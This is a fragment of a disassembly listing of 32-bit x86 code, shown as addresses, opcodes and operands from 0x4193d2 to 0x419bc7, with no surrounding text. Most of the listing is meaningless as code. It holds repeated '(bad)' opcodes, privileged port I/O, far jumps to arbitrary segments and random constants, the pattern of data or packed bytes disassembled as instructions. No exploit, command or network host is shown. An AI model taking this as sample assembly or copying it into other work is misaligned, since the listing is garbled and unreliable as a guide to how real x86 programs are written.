  4193d2:	mov    ds:0x5dd8cbdb,eax
  4193d7:	loopne 0x419421
  4193d9:	sbb    ecx,DWORD PTR [edi-0x2c713a05]
  4193df:	stc    
  4193e0:	add    esi,DWORD PTR [bx+si-0x5d]
  4193e4:	(bad)  
  4193e5:	cmp    al,0x11
  4193e7:	adc    DWORD PTR [edx-0x15],0x8d8fd109
  4193ee:	dec    eax
  4193ef:	leave  
  4193f0:	fdivr  st(7),st
  4193f2:	sbb    al,0xcf
  4193f4:	ds into 
  4193f6:	stos   BYTE PTR es:[edi],al
  4193f7:	dec    esi
  4193f8:	jns    0x41940e
  4193fa:	std    
  4193fb:	shl    BYTE PTR [ecx+0x68],1
  4193fe:	mov    ebx,0x106202c0
  419403:	call   0xfe54df5c
  419408:	adc    edx,eax
  41940a:	xor    eax,0xe24bd0d
  41940f:	dec    eax
  419410:	dec    ebx
  419411:	mov    ds:0xf4c16014,eax
  419416:	scas   al,BYTE PTR es:[edi]
  419417:	aaa    
  419418:	mov    ebx,0xd6bac5e
  41941d:	fild   QWORD PTR [edx+0x69bca0d1]
  419423:	dec    esp
  419424:	push   ss
  419425:	fldenv [edx+0x4a]
  419428:	jbe    0x4193be
  41942a:	pop    esp
  41942b:	push   ebp
  41942c:	jg     0x4194a7
  41942e:	xchg   BYTE PTR [esi+0x13],ch
  419431:	test   DWORD PTR [eax+0x21],ecx
  419434:	dec    ecx
  419435:	ss jp  0x419413
  419438:	xchg   edi,eax
  419439:	repz xor DWORD PTR [edi-0x35],ebx
  41943d:	and    BYTE PTR [ecx],ch
  41943f:	fincstp 
  419441:	jle    0x41945c
  419443:	xor    dl,bh
  419445:	sbb    cl,BYTE PTR [esi-0x1cc0057]
  41944b:	mov    edx,0xa10e0a28
  419450:	lods   al,BYTE PTR ds:[esi]
  419451:	dec    ebx
  419452:	std    
  419453:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419454:	pop    ds
  419455:	in     al,dx
  419456:	inc    DWORD PTR [ebx-0x59]
  419459:	xchg   BYTE PTR [ecx-0x575e3d2d],dh
  41945f:	sbb    BYTE PTR [ecx+0x5c],al
  419462:	outs   dx,DWORD PTR ds:[esi]
  419463:	mov    bl,0xf1
  419465:	fidiv  WORD PTR [esp+eax*1+0x4a]
  419469:	shl    BYTE PTR [esi],0xf7
  41946c:	inc    ebp
  41946d:	imul   ecx,DWORD PTR [ecx+0x1118421],0x46a46fc9
  419477:	mov    ah,ch
  419479:	(bad)  
  41947a:	jle    0x41946f
  41947c:	sub    bh,ah
  41947e:	fwait
  41947f:	jecxz  0x419413
  419481:	mov    dl,0x15
  419483:	push   ds
  419484:	loop   0x4194b0
  419486:	out    dx,eax
  419487:	mov    BYTE PTR [edi+0x15c18190],bh
  41948d:	out    dx,al
  41948e:	jne    0x4194e8
  419490:	mov    esi,0xe05f9ac
  419495:	mov    edi,0x1b624188
  41949a:	and    eax,0x572adc7a
  41949f:	lea    edx,[ecx-0x61]
  4194a2:	push   ebp
  4194a3:	push   cs
  4194a4:	push   ebx
  4194a5:	popa   
  4194a6:	cmp    al,BYTE PTR [esi]
  4194a8:	adc    al,0x86
  4194ab:	adc    bl,dl
  4194ad:	loop   0x419492
  4194af:	sub    ch,bl
  4194b1:	fs adc al,0xf9
  4194b4:	xor    DWORD PTR [ebx+0x68],esp
  4194b7:	pop    ds
  4194b8:	xchg   edx,eax
  4194b9:	xor    edx,esp
  4194bb:	repnz sbb al,0x28
  4194be:	xor    edi,edi
  4194c0:	test   ebp,ebx
  4194c2:	sub    DWORD PTR [eax-0x14],ebx
  4194c5:	fcom   DWORD PTR [ebx-0x6e9cf7ec]
  4194cb:	bound  esi,QWORD PTR [edi]
  4194cd:	fwait
  4194ce:	lods   eax,DWORD PTR ds:[esi]
  4194cf:	jge    0x419453
  4194d1:	xchg   ebx,eax
  4194d2:	retf   0x410a
  4194d5:	or     edi,DWORD PTR [esi-0x79]
  4194d8:	and    BYTE PTR [ebx-0x4f],cl
  4194db:	cmp    eax,0x2eb7f1cb
  4194e0:	sub    eax,0x8fbf903e
  4194e5:	int3   
  4194e6:	jbe    0x419473
  4194e8:	rol    BYTE PTR [ebx+0x6132ce43],1
  4194ee:	cmp    al,0xc8
  4194f0:	or     edi,DWORD PTR [edi-0x44b466c9]
  4194f6:	lods   eax,DWORD PTR ds:[esi]
  4194f7:	push   esi
  4194f8:	mov    ah,0x15
  4194fa:	xor    BYTE PTR [esi-0x1e],0x1f
  4194fe:	pop    ds
  4194ff:	xlat   BYTE PTR ds:[ebx]
  419500:	sub    edx,edx
  419502:	adc    al,0x7e
  419504:	test   al,0x1d
  419506:	add    al,0x40
  419508:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419509:	pushf  
  41950a:	mov    ebx,0x865b39cf
  41950f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419510:	or     eax,0x5bc643e0
  419515:	sub    eax,0x8715c20
  41951a:	cld    
  41951b:	dec    edi
  41951c:	test   DWORD PTR [ebx+0x59f21200],edx
  419522:	pop    ecx
  419523:	std    
  419524:	push   ss
  419525:	push   es
  419526:	lods   eax,DWORD PTR ds:[esi]
  419527:	ret    0x2bf
  41952a:	adc    eax,edx
  41952c:	mov    ah,0x63
  41952e:	sahf   
  41952f:	daa    
  419530:	data16 icebp 
  419532:	scas   al,BYTE PTR es:[edi]
  419533:	xor    DWORD PTR [ecx],esp
  419535:	dec    eax
  419536:	fld    QWORD PTR [esp+ecx*2-0x4f2c3968]
  41953d:	(bad)  
  41953e:	push   0x6a
  419540:	sbb    BYTE PTR [eax-0x8],bl
  419543:	retf   0x49a
  419546:	jmp    0x9cd9:0xf4d4dd27
  41954d:	cmp    BYTE PTR [ecx],0xa1
  419550:	fwait
  419551:	mov    ds:0x6fb47a95,al
  419556:	cmp    esp,DWORD PTR [edx+esi*2-0x3c]
  41955a:	(bad)  
  41955b:	sbb    eax,0x4f2e303f
  419560:	push   ebx
  419561:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419563:	xlat   BYTE PTR ds:[ebx]
  419564:	and    al,0xa9
  419566:	dec    edi
  419567:	mov    ch,0x51
  419569:	mov    ebp,0x663650
  41956e:	mov    dh,0xc8
  419570:	test   eax,0xff43a1dc
  419575:	pop    eax
  419576:	mov    eax,ds:0xf9c34a12
  41957b:	mov    edx,0x6787c93
  419580:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419581:	push   eax
  419582:	or     dl,bh
  419584:	cmp    ah,bl
  419586:	imul   ecx,ebp,0xffffffb0
  419589:	shl    DWORD PTR [ebx],1
  41958b:	iret   
  41958c:	clc    
  41958d:	pop    edx
  41958e:	retf   0xafae
  419591:	aas    
  419592:	jnp    0x419543
  419594:	mov    dl,BYTE PTR [ebp+0x75e8cf28]
  41959a:	fwait
  41959b:	and    DWORD PTR [edi],0x7a
  41959e:	mov    esp,0xe921311
  4195a3:	shr    esp,cl
  4195a5:	xor    al,0xe8
  4195a7:	loope  0x419620
  4195a9:	sbb    WORD PTR [esi+0x7750e03e],bx
  4195b0:	mov    edi,es
  4195b2:	retf   
  4195b3:	aam    0xd5
  4195b5:	fisubr DWORD PTR [ebp-0x12bfb994]
  4195bb:	std    
  4195bc:	ja     0x41955b
  4195be:	jmp    0x686c:0xfe64c59
  4195c5:	cmp    BYTE PTR [ebp+0x57eacaf8],ah
  4195cb:	push   ss
  4195cc:	add    DWORD PTR [ecx-0x7c05175a],esp
  4195d2:	leave  
  4195d3:	xor    edi,ebp
  4195d5:	gs (bad) 
  4195d7:	and    al,0x44
  4195d9:	lea    esp,[ecx]
  4195db:	push   ss
  4195dc:	or     eax,0xc190ee03
  4195e1:	aaa    
  4195e2:	aaa    
  4195e3:	in     al,0x54
  4195e5:	mov    al,ds:0x3e5d7f46
  4195ea:	dec    ecx
  4195eb:	jne    0x4195ea
  4195ed:	mov    ebx,esi
  4195ef:	arpl   si,si
  4195f1:	push   esi
  4195f2:	sub    al,0x93
  4195f4:	pop    ebp
  4195f5:	fnsave [ecx+0x1a4b5d7c]
  4195fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4195fc:	sub    BYTE PTR [ecx+ebp*1-0x4eec4e49],ah
  419603:	push   esp
  419604:	imul   ebp,DWORD PTR [esi],0x10b244d0
  41960a:	jb     0x419676
  41960c:	jbe    0x4195d1
  41960e:	imul   edx,DWORD PTR [eax+ecx*1+0xf],0x98864457
  419616:	neg    ch
  419618:	js     0x41965f
  41961a:	lock jl 0x419692
  41961d:	fldcw  WORD PTR [eax+0x50]
  419620:	xor    al,0xf1
  419622:	push   ss
  419623:	push   cs
  419624:	test   DWORD PTR [ebx-0x7a],esp
  419627:	dec    ebx
  419628:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419629:	lahf   
  41962a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41962b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41962c:	pop    esi
  41962d:	arpl   di,dx
  41962f:	mov    ch,0xfb
  419631:	lea    ecx,[ebp+0x2f11007]
  419637:	push   ebx
  419638:	and    BYTE PTR [esi],bl
  41963a:	pop    es
  41963b:	daa    
  41963c:	or     eax,0xb7c64899
  419641:	rcr    BYTE PTR [edx],0xd9
  419644:	push   esp
  419645:	adc    BYTE PTR [edi+esi*4-0x9],cl
  419649:	sub    ah,ch
  41964b:	mov    ebp,0xa832ead6
  419650:	pusha  
  419651:	and    eax,0x8065627
  419656:	dec    edi
  419657:	jecxz  0x419634
  419659:	out    0x1b,eax
  41965b:	xchg   ebx,eax
  41965c:	xchg   esi,eax
  41965d:	push   ds
  41965e:	jmp    0x7861:0xa2a33595
  419665:	aam    0x46
  419667:	or     eax,0xf0176f3b
  41966c:	aaa    
  41966d:	mov    edi,0xf129221a
  419672:	js     0x419660
  419674:	and    edi,DWORD PTR [ebx-0x17b16485]
  41967a:	sub    BYTE PTR [edi+0x21],cl
  41967d:	rcl    BYTE PTR [edx-0x8d067ba],cl
  419683:	sub    BYTE PTR [ecx],bl
  419685:	mov    eax,0x95c76080
  41968a:	mov    bh,0x50
  41968c:	cmp    al,0x78
  41968e:	test   edi,edx
  419690:	outs   dx,BYTE PTR ds:[esi]
  419691:	stc    
  419692:	iretw  
  419694:	test   DWORD PTR [edx+edi*8],esp
  419697:	add    al,0x92
  419699:	retf   0xa3a5
  41969c:	outs   dx,DWORD PTR ds:[esi]
  41969d:	push   0x29385e1b
  4196a2:	or     eax,0x79da4e5c
  4196a7:	jg     0x419651
  4196a9:	xor    DWORD PTR [edi-0x630bbcd1],esp
  4196af:	dec    esi
  4196b0:	cmp    al,0x18
  4196b2:	adc    dl,cl
  4196b4:	aaa    
  4196b5:	push   ebp
  4196b6:	sti    
  4196b7:	add    al,0x3
  4196b9:	int3   
  4196ba:	lds    ebp,FWORD PTR [eax-0x61e7252]
  4196c0:	int3   
  4196c1:	push   eax
  4196c2:	stos   BYTE PTR es:[edi],al
  4196c3:	mov    ds:0x31c72431,al
  4196c8:	dec    esp
  4196c9:	mov    ecx,0xfe4a950e
  4196ce:	into   
  4196cf:	loopne 0x419668
  4196d1:	and    esi,DWORD PTR [edi-0x56427bcd]
  4196d7:	mov    ebx,0x99186768
  4196dc:	ror    ah,0xe1
  4196df:	repz pop eax
  4196e1:	ret    
  4196e2:	jbe    0x4196a7
  4196e4:	mov    ecx,0x5d3f368
  4196e9:	lds    esp,FWORD PTR [edx-0x1]
  4196ec:	jb     0x419698
  4196ee:	and    al,0xbc
  4196f0:	mov    edi,0x34605c68
  4196f5:	shl    BYTE PTR [edi-0x6abc740d],0xc8
  4196fc:	popf   
  4196fd:	push   ds
  4196fe:	adc    BYTE PTR [esi+0x4e3ae9d8],ch
  419704:	sub    dl,BYTE PTR [edi+ecx*8+0x64]
  419708:	mov    edx,0x4ac610a2
  41970d:	sbb    BYTE PTR [esp+ebx*1-0x2c],al
  419711:	or     DWORD PTR [ebp+0x17],ebx
  419714:	jp     0x4196be
  419716:	xchg   BYTE PTR [esi],ah
  419718:	pop    ecx
  419719:	lods   al,BYTE PTR ds:[esi]
  41971a:	fld    QWORD PTR [ebx-0x1244081e]
  419720:	ins    DWORD PTR es:[edi],dx
  419721:	cld    
  419722:	mov    edx,0x6704bdb9
  419727:	jl     0x4196e8
  419729:	sti    
  41972a:	fst    DWORD PTR [esi+esi*8-0x66]
  41972e:	xor    al,0x60
  419730:	mov    DWORD PTR [ebx+0x55],eax
  419733:	mov    edi,0x4dad21e4
  419738:	mov    esp,0x49334863
  41973d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41973e:	and    dl,al
  419740:	imul   ebx,DWORD PTR [esi],0x15
  419743:	sbb    eax,0x206c6d3b
  419748:	mov    eax,0x63bc0f3b
  41974d:	jae    0x419794
  41974f:	inc    esp
  419750:	xor    eax,0x240a6d05
  419755:	(bad)  
  419757:	mul    DWORD PTR [ebp+0x15]
  41975a:	sbb    edi,DWORD PTR [edi]
  41975c:	push   esp
  41975d:	inc    eax
  41975e:	lods   eax,DWORD PTR ds:[esi]
  41975f:	cs sub ecx,esi
  419762:	cmp    al,0x54
  419764:	or     bl,BYTE PTR [ecx+0x3518b260]
  41976a:	add    DWORD PTR [ecx+0x2d6536b2],esp
  419770:	mov    bl,0x9f
  419772:	(bad)  
  419773:	out    dx,eax
  419774:	mov    edi,0xe7505985
  419779:	gs pop ss
  41977b:	push   esi
  41977c:	adc    ecx,esp
  41977e:	and    al,0xab
  419780:	icebp  
  419781:	or     BYTE PTR [ecx+eiz*1+0x27],0x63
  419786:	outs   dx,BYTE PTR ds:[esi]
  419787:	gs popf 
  419789:	mov    eax,ds:0x209dce40
  41978e:	out    dx,al
  41978f:	sub    al,0xb6
  419791:	xchg   esi,eax
  419792:	loopne 0x4197eb
  419794:	pop    edx
  419795:	rcl    BYTE PTR [ebx],cl
  419797:	xchg   edx,eax
  419798:	xor    BYTE PTR [edx],ch
  41979a:	hlt    
  41979b:	and    ch,BYTE PTR [ecx]
  41979d:	mov    esi,0x57e8045c
  4197a2:	dec    ebp
  4197a3:	imul   esi,DWORD PTR [edx],0xb879ea0e
  4197a9:	or     al,0x80
  4197ab:	pop    ebp
  4197ac:	mov    WORD PTR ds:0x14cca2,es
  4197b2:	dec    edi
  4197b3:	dec    ebx
  4197b4:	cld    
  4197b5:	xor    DWORD PTR [ebx-0x3b],eax
  4197b8:	ins    DWORD PTR es:[edi],dx
  4197b9:	mov    bh,0x1
  4197bc:	hlt    
  4197bd:	and    bl,BYTE PTR [edx-0x2ac87370]
  4197c3:	add    al,0xc
  4197c5:	inc    eax
  4197c6:	popf   
  4197c7:	loopne 0x419751
  4197c9:	call   0xcc812796
  4197ce:	ja     0x419810
  4197d0:	lods   eax,DWORD PTR ds:[esi]
  4197d1:	xchg   esp,eax
  4197d2:	inc    edi
  4197d3:	add    edi,DWORD PTR [ecx]
  4197d5:	mov    ds:0x6de9971d,al
  4197da:	(bad)  
  4197db:	push   0x79
  4197dd:	mov    al,fs:0xa83f9c80
  4197e3:	inc    ebp
  4197e4:	add    dh,BYTE PTR [esp+eiz*8+0x6e]
  4197e8:	mov    bh,0xa4
  4197ea:	lods   al,BYTE PTR ds:[esi]
  4197eb:	ss inc esp
  4197ed:	jno    0x419820
  4197ef:	gs push es
  4197f1:	cmp    eax,0xd5000de
  4197f6:	lock repnz das 
  4197f9:	fs add al,0xcd
  4197fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4197fd:	mov    bh,0x5a
  4197ff:	aam    0xdc
  419801:	repz fwait
  419803:	mov    WORD PTR [ebx-0x1b919302],es
  419809:	rcl    DWORD PTR [edi],1
  41980b:	xchg   edi,eax
  41980c:	ja     0x4197a8
  41980e:	cmp    DWORD PTR [ebx-0x70],eax
  419811:	dec    edx
  419812:	pushf  
  419813:	xchg   DWORD PTR [ecx],edi
  419815:	in     eax,dx
  419816:	call   0x1a6c7572
  41981b:	push   edi
  41981c:	rcr    al,1
  41981e:	into   
  41981f:	and    al,0x36
  419821:	mov    dl,0xb2
  419823:	ds mov ebx,0xbeb7ac5a
  419829:	jbe    0x41981a
  41982b:	push   edx
  41982c:	lock xchg edx,eax
  41982e:	or     edx,DWORD PTR [ecx]
  419830:	sahf   
  419831:	xchg   ebp,eax
  419832:	xor    al,0xb6
  419834:	out    dx,al
  419835:	or     bh,BYTE PTR [edx-0x3bcc787a]
  41983b:	sbb    BYTE PTR [esi],dh
  41983d:	stos   DWORD PTR es:[edi],eax
  41983e:	jnp    0x4197eb
  419840:	add    al,0xa2
  419842:	cli    
  419843:	imul   eax,DWORD PTR [esi],0x29c808fd
  419849:	push   ss
  41984a:	fiadd  DWORD PTR [esi]
  41984c:	xor    BYTE PTR [ecx+0x15],al
  41984f:	inc    edx
  419850:	cwde   
  419851:	or     ch,BYTE PTR [eax+0x55388757]
  419857:	mov    esi,0x283bccc9
  41985c:	in     eax,0x5e
  41985e:	xor    DWORD PTR [eax],0x923a69d1
  419864:	mov    WORD PTR [edi+0x5b3bd2f8],?
  41986a:	ja     0x419876
  41986c:	sub    eax,0xe88163c7
  419871:	xchg   edx,eax
  419872:	sub    DWORD PTR [ecx],0x4caf1f1c
  419878:	clc    
  419879:	jecxz  0x41989c
  41987b:	mov    esp,0x9b929ad2
  419880:	sahf   
  419881:	stos   DWORD PTR es:[edi],eax
  419882:	cmp    eax,ebp
  419884:	or     al,0x7c
  419886:	xchg   ebx,eax
  419887:	int3   
  419888:	pushf  
  419889:	shl    BYTE PTR [edx+0x18],1
  41988c:	dec    ebp
  41988d:	or     bh,al
  41988f:	outs   dx,BYTE PTR ds:[esi]
  419890:	dec    eax
  419891:	fcomp  DWORD PTR [esp+edx*8-0x5d]
  419895:	mov    BYTE PTR [ebp-0x62cc578],cl
  41989b:	loope  0x41986c
  41989d:	jns    0x41989a
  41989f:	sti    
  4198a0:	xor    DWORD PTR [eax+0x1e],0x4160f150
  4198a7:	add    al,0xee
  4198a9:	mov    ah,0x25
  4198ab:	gs pushf 
  4198ad:	inc    edx
  4198ae:	add    ch,BYTE PTR [ebx-0x44]
  4198b1:	jnp    0x419900
  4198b3:	and    ch,BYTE PTR [ecx]
  4198b5:	jmp    0xe27b918
  4198ba:	iret   
  4198bb:	push   ss
  4198bc:	xchg   ecx,eax
  4198bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4198be:	jle    0x4198f1
  4198c0:	inc    esp
  4198c1:	daa    
  4198c2:	mov    ds:0x9dc9fcf2,eax
  4198c7:	mov    ds:0xf3ef6021,eax
  4198cc:	in     al,dx
  4198cd:	inc    ebp
  4198ce:	sbb    DWORD PTR [esi-0x69],ebx
  4198d1:	mov    ch,0xa9
  4198d3:	repnz xor al,0x56
  4198d6:	xor    cl,cl
  4198d8:	out    0x6b,al
  4198da:	mov    al,BYTE PTR [edx-0x7a]
  4198dd:	dec    edi
  4198de:	cmc    
  4198df:	xchg   ah,dh
  4198e1:	xor    DWORD PTR [edi-0x15],0x19669261
  4198e8:	mov    WORD PTR [ebx+0x1e],es
  4198eb:	mov    cl,0x68
  4198ed:	pushf  
  4198ee:	push   ebp
  4198ef:	ins    DWORD PTR es:[edi],dx
  4198f0:	adc    BYTE PTR [ebx+0x78642421],dh
  4198f6:	sub    bl,BYTE PTR [esi-0x3c1c23c6]
  4198fc:	cli    
  4198fd:	js     0x419933
  4198ff:	pop    ds
  419900:	sub    BYTE PTR [edi-0x22],0x78
  419904:	mov    ch,0x43
  419906:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419907:	mov    ds:0x5b1b34f2,al
  41990c:	fdivr  st(0),st
  41990e:	out    dx,al
  41990f:	adc    dl,BYTE PTR [edx-0x68]
  419912:	sub    DWORD PTR [eax],esi
  419914:	(bad)  
  419915:	xor    ah,BYTE PTR [eax+ebp*8-0x65]
  419919:	outs   dx,DWORD PTR ds:[esi]
  41991a:	enter  0xf53e,0xf3
  41991e:	add    eax,0x2980143b
  419923:	pop    edx
  419924:	adc    eax,0xc8e5802a
  419929:	out    0xbf,eax
  41992b:	add    al,0xe8
  41992d:	xchg   ebx,eax
  41992e:	mov    bh,BYTE PTR [edx+ecx*4+0x5a]
  419932:	pop    es
  419933:	dec    ebp
  419934:	mov    ebp,ebx
  419936:	inc    ecx
  419937:	lock xor DWORD PTR [ecx-0x5114daad],edx
  41993e:	inc    eax
  41993f:	sub    cl,BYTE PTR [ebx-0x298f203d]
  419945:	cdq    
  419946:	ror    DWORD PTR [edx],0xf3
  419949:	fcom   QWORD PTR [ebx]
  41994b:	mov    ch,BYTE PTR [edx-0x2b]
  41994e:	retf   
  41994f:	and    eax,0x26c9c143
  419954:	das    
  419955:	mov    ebx,0xe23cd1da
  41995a:	popa   
  41995b:	add    BYTE PTR [edi-0x54e43ef7],ah
  419961:	mov    DWORD PTR [ebx+0x3a18e89f],esi
  419967:	outs   dx,DWORD PTR ds:[esi]
  419968:	mov    eax,0xb8d78648
  41996d:	mov    bl,0xf5
  41996f:	jl     0x41990c
  419971:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419972:	dec    ebx
  419973:	jge    0x41998f
  419975:	dec    esi
  419976:	or     ah,0x2c
  419979:	jae    0x419977
  41997b:	mov    eax,0xc77b7341
  419980:	mov    ch,bl
  419982:	in     eax,dx
  419983:	es ret 0xa51b
  419987:	xchg   esi,eax
  419988:	mov    ds:0x3efe9cfd,eax
  41998d:	into   
  41998e:	mov    al,ds:0x55c4917b
  419993:	rcl    BYTE PTR [edi],1
  419995:	cld    
  419996:	bound  ebx,QWORD PTR [esi-0xfa33354]
  41999c:	xchg   BYTE PTR [ecx-0x61f3b2a7],dh
  4199a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4199a3:	cmp    edx,edx
  4199a5:	enter  0xe861,0x22
  4199a9:	pop    ecx
  4199aa:	in     al,dx
  4199ab:	mov    bh,0x56
  4199ad:	shl    ecx,0x79
  4199b0:	jg     0x4199f2
  4199b2:	push   edx
  4199b3:	in     eax,0xfd
  4199b5:	add    eax,0xf7c48d10
  4199ba:	sub    DWORD PTR [edi+0x2fc93c23],esp
  4199c0:	test   DWORD PTR [ecx-0x70956bdd],edi
  4199c6:	scas   eax,DWORD PTR es:[edi]
  4199c7:	jne    0x41999a
  4199c9:	pop    ecx
  4199ca:	ins    DWORD PTR es:[edi],dx
  4199cb:	mov    ch,0xa0
  4199cd:	xor    ah,BYTE PTR [eax-0x1]
  4199d0:	push   esi
  4199d1:	sbb    ebp,esp
  4199d3:	aad    0x33
  4199d5:	mov    bh,BYTE PTR [edx-0x6b]
  4199d8:	cdq    
  4199d9:	xchg   edx,eax
  4199da:	fistp  WORD PTR ds:0x678d5b0f
  4199e0:	mov    eax,0xc36e8a8f
  4199e5:	popa   
  4199e6:	xor    ch,BYTE PTR [esi]
  4199e8:	call   0xfcc86286
  4199ed:	inc    esi
  4199ee:	enter  0xa570,0xbf
  4199f2:	push   ss
  4199f3:	and    BYTE PTR [edx],bh
  4199f5:	add    bh,BYTE PTR [eax-0x44]
  4199f8:	or     eax,0x7798987c
  4199fd:	add    BYTE PTR [edi+0x4d5a8632],ch
  419a03:	fadd   DWORD PTR [edi]
  419a05:	repz pop ebx
  419a07:	in     eax,dx
  419a08:	pop    ebx
  419a09:	test   esp,0xce50affc
  419a0f:	sub    ch,bh
  419a11:	add    DWORD PTR [edi+0xe],0x39
  419a15:	repz cld 
  419a17:	aaa    
  419a18:	popa   
  419a19:	push   ss
  419a1a:	in     eax,dx
  419a1b:	out    0xe8,al
  419a1d:	std    
  419a1e:	retf   0x9ad7
  419a21:	or     BYTE PTR [ebx],ah
  419a23:	das    
  419a24:	or     al,0xe6
  419a26:	xchg   DWORD PTR [esi-0x71],edx
  419a29:	xor    BYTE PTR [ebx+ebx*2],ah
  419a2c:	ds mov dl,0x4f
  419a2f:	inc    edi
  419a30:	aaa    
  419a31:	dec    esp
  419a32:	mov    dh,0x35
  419a34:	pop    edi
  419a35:	iret   
  419a36:	ret    0x40b7
  419a39:	xor    DWORD PTR [ebx+0x5a],edi
  419a3c:	fcom   QWORD PTR [si-0x4f]
  419a40:	jmp    0xeacb:0xa4e205b8
  419a47:	xor    BYTE PTR [edi+edi*1-0x70e254bb],dh
  419a4e:	xchg   ebx,eax
  419a4f:	call   0x958c:0xb4e46a39
  419a56:	sbb    BYTE PTR [esi+ebp*2-0x1568f785],0x4f
  419a5e:	int    0xf7
  419a60:	pop    edi
  419a61:	jecxz  0x419a66
  419a63:	lock cmp BYTE PTR [eax-0x15],dh
  419a67:	mov    bh,0x23
  419a69:	push   edx
  419a6a:	mov    al,0x2d
  419a6c:	mov    edi,0x1baa717a
  419a71:	cdq    
  419a72:	(bad)
  419a76:	xor    BYTE PTR [ebp+0x6b],dh
  419a79:	adc    bl,bl
  419a7b:	int3   
  419a7c:	adc    BYTE PTR [edi+0x61],bh
  419a7f:	fucomp st(6)
  419a81:	ds stc 
  419a83:	loope  0x419a4b
  419a85:	outs   dx,BYTE PTR ds:[esi]
  419a86:	inc    ecx
  419a87:	mov    bh,0x85
  419a89:	inc    esp
  419a8a:	xchg   edx,eax
  419a8b:	(bad)  
  419a8c:	hlt    
  419a8d:	std    
  419a8e:	mov    edi,0xb37488b
  419a93:	or     BYTE PTR [eax-0x52],ch
  419a96:	inc    ecx
  419a97:	add    ebp,DWORD PTR [edi]
  419a99:	aas    
  419a9a:	inc    edx
  419a9b:	leave  
  419a9c:	add    eax,0xeb6948be
  419aa1:	repz and DWORD PTR [ebx+0x67],0x69f630fc
  419aa9:	cmp    DWORD PTR [ebx-0x250a4e82],ecx
  419aaf:	xchg   ecx,eax
  419ab0:	cmp    eax,0xe431d9bb
  419ab5:	imul   esp,DWORD PTR [ebx-0xd],0x5c
  419ab9:	cmp    al,0x7a
  419abb:	mov    WORD PTR [ebx+ebx*2+0x2f],ss
  419abf:	(bad)  
  419ac0:	jmp    0x84c6:0xc7ec28a
  419ac7:	stos   DWORD PTR es:[edi],eax
  419ac8:	or     eax,edx
  419aca:	xchg   esi,eax
  419acb:	push   eax
  419acc:	icebp  
  419acd:	xchg   ebp,eax
  419ace:	iret   
  419acf:	sub    DWORD PTR [edx-0x54],0x6c
  419ad3:	fdivp  st(0),st
  419ad5:	gs repnz dec esp
  419ad8:	call   0x34085266
  419add:	jne    0x419b25
  419adf:	mov    ebx,0x1ecf0de7
  419ae4:	je     0x419b32
  419ae6:	out    0x32,al
  419ae8:	cwde   
  419ae9:	xchg   ebp,eax
  419aea:	lea    eax,[edx+0x772876a]
  419af0:	enter  0x3fbc,0x6d
  419af4:	out    0xe9,al
  419af6:	fisttp WORD PTR [esi]
  419af8:	add    BYTE PTR [eax+0xd],al
  419afb:	jns    0x419ab9
  419afd:	and    bl,BYTE PTR [ebp-0x3b]
  419b00:	fld    TBYTE PTR [ecx+0x61624f7f]
  419b06:	xor    cl,BYTE PTR [ebx-0x5f3146d6]
  419b0c:	fild   DWORD PTR [esi]
  419b0e:	in     eax,dx
  419b0f:	jbe    0x419b23
  419b11:	adc    ah,bl
  419b13:	fiadd  DWORD PTR [edi-0x57]
  419b16:	and    ch,dl
  419b18:	cmp    DWORD PTR [edx-0x771a50fa],ebx
  419b1e:	mov    eax,0x4d63e9ae
  419b23:	iret   
  419b24:	inc    ebx
  419b25:	add    dh,BYTE PTR [ecx-0x70c533e7]
  419b2b:	jg     0x419b64
  419b2d:	add    al,0xaa
  419b2f:	cmp    dh,BYTE PTR [eax+0x4665b082]
  419b35:	aaa    
  419b36:	lahf   
  419b37:	stos   BYTE PTR es:[edi],al
  419b38:	and    BYTE PTR [eax-0x51],0xb0
  419b3c:	xor    al,0xa0
  419b3e:	mov    dh,0x29
  419b40:	bound  edi,QWORD PTR [ebx+0x69]
  419b43:	dec    eax
  419b44:	pusha  
  419b45:	ret    
  419b46:	add    ebx,DWORD PTR [edi+0x70331234]
  419b4c:	cmp    BYTE PTR [edx+0x41e9b819],cl
  419b52:	mov    dl,0x41
  419b54:	add    dl,BYTE PTR ds:0x3dcd4ad8
  419b5a:	test   DWORD PTR [esi],edx
  419b5c:	es fwait
  419b5e:	xlat   BYTE PTR ds:[ebx]
  419b5f:	pop    eax
  419b60:	dec    edx
  419b61:	dec    esi
  419b62:	and    eax,0xc333dab9
  419b67:	stos   BYTE PTR es:[edi],al
  419b68:	sar    DWORD PTR [esp+eax*2-0x143decd3],cl
  419b6f:	rcr    BYTE PTR [edx+ecx*1-0x68],1
  419b73:	xchg   dh,bl
  419b75:	push   0x1dede089
  419b7a:	into   
  419b7b:	or     eax,0x9c8bd016
  419b80:	ret    
  419b81:	jnp    0x419be1
  419b83:	push   dx
  419b85:	pop    eax
  419b86:	(bad)  
  419b89:	or     esp,ecx
  419b8b:	add    eax,0x81f9b146
  419b90:	test   al,0xc
  419b92:	pop    esi
  419b93:	mov    cl,0xee
  419b95:	gs pop esp
  419b97:	jns    0x419bfb
  419b99:	sbb    eax,0xadf293a0
  419b9e:	bnd ret 
  419ba0:	aaa    
  419ba1:	and    eax,0xc0dd82b0
  419ba6:	inc    esi
  419ba7:	dec    ecx
  419ba8:	pop    ds
  419ba9:	retf   0xea7d
  419bac:	or     eax,0x48c62ac4
  419bb1:	fwait
  419bb2:	and    BYTE PTR gs:[eax-0x3c],cl
  419bb6:	cmp    eax,0x17c3487f
  419bbb:	ror    BYTE PTR [ecx-0x32266ebf],1
  419bc1:	push   edx
  419bc2:	daa    
  419bc3:	push   cs
  419bc4:	lods   al,BYTE PTR ds:[esi]
  419bc5:	in     eax,0xc0
  419bc7:	cmp    DWORD PTR [edi],ebx
